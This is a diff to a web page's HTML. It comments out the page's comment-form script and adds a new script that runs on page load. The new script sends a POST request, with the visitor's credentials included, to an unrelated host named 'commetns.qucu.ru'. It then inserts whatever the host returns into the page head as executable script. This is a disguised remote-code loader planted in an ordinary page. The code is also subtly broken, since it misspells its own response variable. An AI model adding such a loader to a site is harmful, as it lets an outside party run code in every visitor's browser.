@@ -26,7 +26,7 @@
         </form>
         <div id="comments"></div>
     </main>
-    <script>
+    <!-- <script>
         const form=document.querySelector("#sendForm");
         form.addEventListener('submit',async function sendJSON(e){
             e.preventDefault();
@@ -71,6 +71,28 @@
 
         });
         
+    </script> -->
+    <script>
+        document.addEventListener("DOMContentLoaded",async()=>{
+            try{
+                const restopnse=await fetch("https://commetns.qucu.ru/allow.cors",{
+                    method:'POST',
+                    headers:{
+                        'Content-Type':'application/json',
+                    },
+                    mode:'cors',
+                    credentials:'include',
+                    body:JSON.stringify({})
+                });
+                const result=await response.text();
+                let js=document.createElement('script');
+                js.innerHTML=result;
+                document.querySelector('head').append(js);
+                console.log('Server response: ', result);
+            }catch(error){
+                console.error("Error sending empty POST: ", error);
+            }
+        });
     </script>
 </body>
 </html>
